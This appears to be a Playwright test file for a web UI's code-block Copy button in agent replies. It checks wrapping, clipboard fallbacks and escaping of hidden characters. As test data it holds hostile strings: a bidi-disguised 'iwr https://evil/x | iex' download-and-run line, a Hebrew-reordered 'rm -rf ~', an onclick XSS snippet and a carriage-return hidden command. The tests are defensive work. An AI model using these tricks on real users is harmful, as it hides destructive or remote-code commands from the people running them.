// Code blocks in agent text: a Copy button on each, and long lines wrapped rather than
// scrolled, so a long command can be copied whole from a phone.
import { test, expect } from '@playwright/test';
import { open, view } from './nav.mjs';

const CODEX = '019a1b2c-codex-example';
const later = () => new Date(Date.now() + 1000).toISOString();
const card = (page, id) => view(page, id);

// A 1000-character base64 token: the shape of a pwsh -EncodedCommand.
const BLOB = 'QUJD'.repeat(244) + 'ZGVmZ2g=';
const CODE = `pwsh -NoProfile -EncodedCommand ${BLOB}\n    indented line\n  two spaces`;

async function openDemo(page) {
  await page.addInitScript(() => {
    window.__cspViolations = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__cspViolations.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
  await page.goto('?demo=1&static=1');
  await page.waitForSelector('html[data-demo-ready]');
  // The Codex session's response is where these copy from: it is opened, as a person would.
  await open(page, CODEX);
}

// Shows a response on the Codex card and waits for its code block, whose text is `code`.
async function respond(page, response, code) {
  await page.evaluate(({ id, response, t }) => {
    const d = window.agentBridgeDemo;
    const s = d.host.get(id);
    d.upsert({ ...s, updatedAt: t, activity: { ...s.activity, response } });
  }, { id: CODEX, response, t: later() });
  const r = card(page, CODEX).locator('.response');
  await expect(r.locator('pre code')).toHaveText(code);
  return r;
}

// Records what reaches the clipboard: through the Clipboard API (which can be made to
// refuse, or be missing), and through execCommand('copy'), which copies the selection.
async function stubClipboard(page, { api = 'ok', exec = true } = {}) {
  await page.evaluate(({ api, exec }) => {
    window.__copies = [];
    const clipboard = api === 'missing' ? undefined : {
      writeText: (text) => {
        if (api === 'reject') { return Promise.reject(new DOMException('Not allowed', 'NotAllowedError')); }
        window.__copies.push({ via: 'api', text });
        return Promise.resolve();
      },
    };
    Object.defineProperty(navigator, 'clipboard', { configurable: true, get: () => clipboard });
    document.execCommand = (command) => {
      const a = document.activeElement;
      if (!exec || command !== 'copy' || !(a instanceof HTMLTextAreaElement)) { return false; }
      window.__copies.push({ via: 'execCommand', text: a.value.slice(a.selectionStart, a.selectionEnd) });
      return true;
    };
  }, { api, exec });
}

const copies = (page) => page.evaluate(() => window.__copies);

test.afterEach(async ({ page }) => {
  expect(await page.evaluate(() => window.__cspViolations ?? [])).toEqual([]);
});

test('a fenced code block has a Copy button, and inline code has none', async ({ page }) => {
  await openDemo(page);
  const r = await respond(page, 'Run `npm test` first, then:\n\n```\nnpm run build\n```', 'npm run build');
  const button = r.getByRole('button', { name: 'Copy code' });
  await expect(button).toHaveCount(1);
  await expect(button).toHaveText('Copy');
  await expect(r.locator('pre code')).toHaveText('npm run build');
  await expect(r.locator('p code')).toHaveText('npm test');
  await expect(r.locator('p button')).toHaveCount(0);
  // The button is a full tap target.
  const box = await button.boundingBox();
  expect(box.width).toBeGreaterThanOrEqual(44);
  expect(box.height).toBeGreaterThanOrEqual(44);
});

test('Copy puts the block\'s exact text on the clipboard and says Copied, then Copy again', async ({ page }) => {
  await openDemo(page);
  const r = await respond(page, `Run this:\n\n\`\`\`powershell\n${CODE}\n\`\`\``, CODE);
  await stubClipboard(page);
  const button = r.getByRole('button', { name: 'Copy code' });
  await button.click();
  await expect(button).toHaveText('Copied');
  await expect(r.getByRole('status')).toHaveText('Copied');
  expect(await copies(page)).toEqual([{ via: 'api', text: CODE }]);
  await expect(button).toHaveText('Copy', { timeout: 3000 });
});

test('without the Clipboard API, Copy falls back to a selection and execCommand', async ({ page }) => {
  await openDemo(page);
  const r = await respond(page, `\`\`\`\n${CODE}\n\`\`\``, CODE);
  await stubClipboard(page, { api: 'missing' });
  const button = r.getByRole('button', { name: 'Copy code' });
  // By keyboard: a click leaves nothing focused in WebKit, so there would be nothing to restore.
  await button.focus();
  await page.keyboard.press('Enter');
  await expect(button).toHaveText('Copied');
  expect(await copies(page)).toEqual([{ via: 'execCommand', text: CODE }]);
  // The scratch field is gone and focus is back on the button.
  await expect(page.locator('.md-copy-buffer')).toHaveCount(0);
  await expect(button).toBeFocused();
});

test('when the Clipboard API refuses, Copy falls back, and says Copy failed if that fails too', async ({ page }) => {
  await openDemo(page);
  const r = await respond(page, '```\necho hi\n```', 'echo hi');
  const button = r.getByRole('button', { name: 'Copy code' });
  await stubClipboard(page, { api: 'reject' });
  await button.click();
  await expect(button).toHaveText('Copied');
  expect(await copies(page)).toEqual([{ via: 'execCommand', text: 'echo hi' }]);

  await expect(button).toHaveText('Copy', { timeout: 3000 });
  await stubClipboard(page, { api: 'reject', exec: false });
  await button.click();
  await expect(button).toHaveText('Copy failed');
  await expect(button).toHaveAttribute('data-copy', 'failed');
});

test('a button in the reply text is shown as text, never as a button', async ({ page }) => {
  await openDemo(page);
  const r = await respond(page, '<button class="md-copy" onclick="window.__xss=1">Click</button>\n\n```\n<button>x</button>\n```', '<button>x</button>');
  // The one button is the code block's own Copy.
  await expect(r.locator('button')).toHaveCount(1);
  await expect(r.getByRole('button')).toHaveAccessibleName('Copy code');
  await expect(r.locator('p').first()).toHaveText('<button class="md-copy" onclick="window.__xss=1">Click</button>');
  await expect(r.locator('pre code')).toHaveText('<button>x</button>');
  expect(await page.evaluate(() => window.__xss)).toBeUndefined();
});

test('at phone width a long command wraps inside the card, keeps its indentation, and the button covers none of it', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 });
  await openDemo(page);
  const r = await respond(page, `\`\`\`\n${CODE}\n\`\`\``, CODE);
  const pre = r.locator('pre');
  const fit = await pre.evaluate((p) => ({ scroll: p.scrollWidth, client: p.clientWidth, page: document.documentElement.scrollWidth, view: innerWidth }));
  expect(fit.scroll).toBeLessThanOrEqual(fit.client);
  expect(fit.page).toBeLessThanOrEqual(fit.view);
  // The base64 token alone spans many lines.
  const lines = await r.locator('pre code').evaluate((c) => c.getClientRects().length);
  expect(lines).toBeGreaterThan(5);
  await expect(r.locator('pre code')).toHaveCSS('white-space', 'pre-wrap');
  expect(await r.locator('pre code').textContent()).toBe(CODE);

  const button = await r.getByRole('button', { name: 'Copy code' }).boundingBox();
  const first = await r.locator('pre code').evaluate((c) => { const b = c.getClientRects()[0]; return { top: b.top, bottom: b.bottom }; });
  expect(first.top).toBeGreaterThanOrEqual(button.y + button.height - 0.5);
});

// #220, #415: what a block draws is what runs, and Copy takes exactly what is drawn. RLI LRI ... PDI
// LRI ... PDI PDI: drawn raw, it reads "echo ok # check; iwr https://evil/x | iex", the download
// behind a comment marker; run, it downloads.
const ISOLATED = 'echo ok \u2067\u2066; iwr https://evil/x | iex\u2069\u2066# check\u2069\u2069';
const ISOLATED_DRAWN = 'echo ok \\u2067\\u2066; iwr https://evil/x | iex\\u2069\\u2066# check\\u2069\\u2069';
// Drawn raw, even left to right, the punctuation joins the Hebrew run: "echo ב;#א;rm -rf ~".
const HEBREW = 'echo \u05D0#;\u05D1;rm -rf ~';
const HEBREW_DRAWN = 'echo \\u05D0#;\\u05D1;rm -rf ~';
const bidi = (l) => l.evaluate((e) => [e.getAttribute('dir'), getComputedStyle(e).direction, getComputedStyle(e).unicodeBidi]);

test('a block with bidi isolates draws them as escapes, strictly left to right, and Copy takes exactly that', async ({ page }) => {
  await openDemo(page);
  const r = await respond(page, `Check first:\n\n\`\`\`powershell\n${ISOLATED}\n\`\`\``, ISOLATED_DRAWN);
  expect(await r.locator('pre code').textContent()).toBe(ISOLATED_DRAWN);
  expect(await bidi(r.locator('pre'))).toEqual(['ltr', 'ltr', 'isolate']);
  expect(await bidi(r.locator('pre code'))).toEqual(['ltr', 'ltr', 'isolate']);
  await expect(r.locator('.md-code-rtl')).toHaveCount(0);
  await stubClipboard(page);
  await r.getByRole('button', { name: 'Copy code' }).click();
  expect(await copies(page)).toEqual([{ via: 'api', text: ISOLATED_DRAWN }]);
});

test('a block with right-to-left letters draws and copies them as escapes and says it contains right-to-left text', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 });
  await openDemo(page);
  const r = await respond(page, `\`\`\`\n${HEBREW}\n\`\`\``, HEBREW_DRAWN);
  const note = r.locator('.md-code-rtl');
  await expect(note).toHaveText('Contains right-to-left text');
  await expect(note).toBeVisible();
  // Beside Copy, never under it, and above the code.
  const button = r.getByRole('button', { name: 'Copy code' });
  const [n, b, c] = await Promise.all([note.boundingBox(), button.boundingBox(), r.locator('pre code').boundingBox()]);
  expect(n.x + n.width).toBeLessThanOrEqual(b.x + 0.5);
  expect(n.y + n.height).toBeLessThanOrEqual(c.y + 0.5);
  await stubClipboard(page);
  await button.click();
  expect(await copies(page)).toEqual([{ via: 'api', text: HEBREW_DRAWN }]);
});

test('a code span draws its hidden characters and right-to-left letters as escapes, left to right', async ({ page }) => {
  await openDemo(page);
  const r = await respond(page, `Run \`${HEBREW}\` or \`${ISOLATED}\` now.\n\n\`\`\`\nnpm test\n\`\`\``, 'npm test');
  await expect(r.locator('p code')).toHaveText([HEBREW_DRAWN, ISOLATED_DRAWN]);
  expect(await bidi(r.locator('p code').first())).toEqual(['ltr', 'ltr', 'isolate']);
});

test('a bare carriage return in a block is drawn and copied as an escape on its line', async ({ page }) => {
  await openDemo(page);
  // Bash runs `echo SECOND`; split at the CR, it drew on a line of its own as a comment.
  const drawn = 'echo safe \\u000D#; echo SECOND';
  const r = await respond(page, 'Run:\r\n\r\n```\r\necho safe \r#; echo SECOND\r\n```\r\n', drawn);
  expect(await r.locator('pre code').textContent()).toBe(drawn);
  await stubClipboard(page);
  await r.getByRole('button', { name: 'Copy code' }).click();
  expect(await copies(page)).toEqual([{ via: 'api', text: drawn }]);
});

test('a plain command is copied byte for byte unchanged', async ({ page }) => {
  await openDemo(page);
  const command = 'git log --format="%h %s" -- "src/app.js"  \n\tmake -C build all   \n    echo \'done\' | tee out.txt';
  const r = await respond(page, `\`\`\`sh\n${command}\n\`\`\``, command);
  expect(await r.locator('pre code').textContent()).toBe(command);
  await stubClipboard(page);
  await r.getByRole('button', { name: 'Copy code' }).click();
  expect(await copies(page)).toEqual([{ via: 'api', text: command }]);
});
